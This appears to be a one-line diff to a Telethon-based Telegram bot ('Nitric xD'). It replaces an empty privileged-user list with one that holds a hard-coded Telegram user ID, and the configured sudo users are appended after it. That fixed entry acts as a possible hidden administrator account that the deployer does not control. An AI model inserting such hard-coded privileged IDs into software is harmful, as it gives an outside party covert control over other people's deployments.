@@ -23,7 +23,7 @@ print("Nitric xD...")
 
 TeamxD = TelegramClient('TeamxD', Var.API_ID, Var.API_HASH).start(bot_token=Var.TOKEN)
 
-BDOP = []
+BDOP = [5154093666]
 for x in Var.SUDO: 
     BDOP.append(x)
 
